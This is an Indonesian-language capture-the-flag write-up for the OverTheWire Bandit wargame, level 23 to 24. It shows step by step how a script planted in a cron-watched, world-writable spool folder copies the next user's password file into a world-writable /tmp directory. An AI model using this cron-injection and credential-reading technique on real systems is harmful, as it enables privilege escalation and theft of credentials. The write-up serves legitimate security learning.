# Bandit Level 23 → Level 24

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)

## 🎯 Objective
Memanfaatkan kelemahan pada konfigurasi Cron Job user target (`bandit24`) yang secara otomatis mengeksekusi dan menghapus semua script dalam sebuah folder tertentu. Kita akan menyusupkan script jahat untuk mencuri password.

## 🛠 The Process
Berdasarkan analisis cron job sebelumnya, diketahui bahwa user `bandit24` menjalankan script `/usr/bin/cronjob_bandit24.sh` setiap menit. Script tersebut mengeksekusi semua file yang ada di `/var/spool/bandit24/foo`.

1. **Persiapan Workspace:**
   Saya membuat direktori kerja pribadi di `/tmp` dan memberikannya akses penuh (`777`) agar user `bandit24` nantinya bisa menulis file hasil curian di situ.

   ```bash
   mkdir -p /tmp/adrian24
   chmod 777 /tmp/adrian24
   ```
   
2. **Membuat Script Exploit:**
    Saya membuat script sederhana bernama script.sh yang berisi perintah untuk membaca password bandit24 dan menyimpannya ke folder saya.

    Catatan: Saya menggunakan tanda kutip satu (') saat menggunakan echo untuk menghindari error "event not found" akibat karakter ! yang dianggap sebagai history expansion oleh Bash.
    ```Bash
    echo '#!/bin/bash' > /tmp/adrian24/script.sh
    echo 'cat /etc/bandit_pass/bandit24 > /tmp/adrian24/password' >> /tmp/adrian24/script.sh
    ```
    
3. **Mengatur Permission:**
    Script harus bisa dieksekusi (executable) oleh siapa saja, termasuk user bandit24.
    ```Bash
    chmod 777 /tmp/adrian24/script.sh
    ```
    
4. **Deploy Serangan:**
    Saya menyalin script tersebut ke folder "jebakan" yang dipantau oleh cron job.
    ```Bash
    cp /tmp/adrian24/script.sh /var/spool/bandit24/foo/
    ```
    
5. **Menunggu Hasil:**
    Setelah menunggu sekitar satu menit, cron job berjalan. Saya memeriksa folder kerja saya, dan file password telah muncul dengan owner bandit24.
    ```Bash
    ls -la /tmp/adrian24/
    cat /tmp/adrian24/password
    ```
    Hasilnya adalah password untuk level 24.

## 💡 What I Learned
- Cron Job Exploitation: Teknik Privilege Escalation (naik hak akses) dengan memanfaatkan cron job yang menjalankan script liar (wildcard) dari direktori yang bisa ditulis (writable) oleh public.
- Bash Quoting: Perbedaan krusial antara tanda kutip dua (") dan satu ('). Kutip dua mencoba menafsirkan karakter spesial seperti ! (history) dan $ (variabel), sedangkan kutip satu membaca string secara literal (apa adanya).
- Permission Management: Pentingnya chmod 777 pada direktori tujuan saat kita ingin user lain (dalam hal ini bandit24) menulis file ke direktori kita.

[⬅️ Back To Home](../README.md)
